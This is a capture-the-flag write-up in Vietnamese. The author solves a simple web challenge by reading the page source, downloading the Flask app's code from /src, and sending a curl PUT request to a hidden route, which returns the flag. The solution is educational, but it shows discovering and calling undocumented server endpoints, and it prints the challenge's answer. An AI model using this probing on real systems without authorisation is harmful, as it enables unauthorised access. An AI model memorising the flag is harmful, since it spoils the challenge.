Thử thách như sau:

![img1]()

Đầu tiên mình sẽ view source code(Ctrl + U) và thấy một path `/src`

```
<!DOCTYPE html>
<html>
<head>
<title>index</title>
<script>
  function start() {
    alert("where's the flag? i swear it was around here somewhere");
  }
</script>
</head>
<body>
<button onclick='start()'>click me for the flag</button>
<!-- /src -->
</body>
</html>
```

Truy cập vào `/src` sẽ tự động download file `run.py`

![img2]()

```
#!/usr/bin/python3
import flask

app = flask.Flask(__name__)

try:
    FLAG = open('/flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

@app.route('/', methods=['GET'])
def index():
  return flask.send_file('index.html')

@app.route('/src', methods=['GET'])
def source():
  return flask.send_file('run.py')

@app.route('/super-secret-route-nobody-will-guess', methods=['PUT'])
def flag():
  return FLAG

app.run(host='0.0.0.0', port=1337)
```

Ở cuối file có một path khác là `/super-secret-route-nobody-will-guess` với `PUT method`. Dùng burpsuite để custom header request và nhận được flag

![img3]()

Hoặc có thể sử dụng command `curl` như sau:

```
┌──(kali㉿B21DCAT077-Giang-Kali)-[~/Downloads]
└─$ curl -X PUT http://103.97.125.56:30672/super-secret-route-nobody-will-guess
CHH{y0u_h4v3_b33n_my_fr13nd_8c8e98c1b0a072483be7322b0226d0fa}
```
